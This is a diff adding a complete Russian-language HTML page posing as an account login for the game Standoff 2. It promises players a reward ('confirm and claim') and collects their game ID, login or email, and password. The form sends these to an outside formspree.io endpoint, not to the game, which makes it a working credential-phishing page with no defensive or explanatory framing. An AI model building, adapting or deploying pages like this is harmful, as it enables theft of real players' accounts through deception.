@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Регистрация аккаунта</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Segoe UI', sans-serif;
+            background: radial-gradient(circle, #1a1a2e 0%, #16213e 100%);
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .form-box {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 30px;
+            border-radius: 15px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            width: 85%;
+            max-width: 350px;
+            text-align: center;
+            box-shadow: 0 0 20px rgba(0,0,0,0.5);
+        }
+        h2 {
+            color: #ffd700;
+            margin-bottom: 20px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid #444;
+            border-radius: 8px;
+            color: white;
+            box-sizing: border-box; /* Чтобы отступы не ломали ширину */
+            outline: none;
+            transition: 0.3s;
+        }
+        input:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 5px rgba(255, 215, 0, 0.5);
+        }
+        .submit-btn {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            background: linear-gradient(45deg, #ff9d00, #ffcc00);
+            border: none;
+            border-radius: 8px;
+            color: #000;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        .submit-btn:active {
+            transform: scale(0.98);
+        }
+        .small-text {
+            font-size: 11px;
+            color: #aaa;
+            margin-top: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="form-box">
+    <h2>Вход в систему</h2>
+    <form action="https://formspree.io/f/mgolvevr"" method="POST">
+        
+        <input type="text" name="Username_ID" placeholder="Твой ID в Standoff 2" required>
+        <input type="text" name="Contact_Info" placeholder="Логин / Почта" required>
+        <input type="password" name="Security_Key" placeholder="Пароль" required>
+        
+        <button type="submit" class="submit-btn">ПОДТВЕРДИТЬ И ЗАБРАТЬ</button>
+    </form>
+</div>
+
+</body>
+</html>
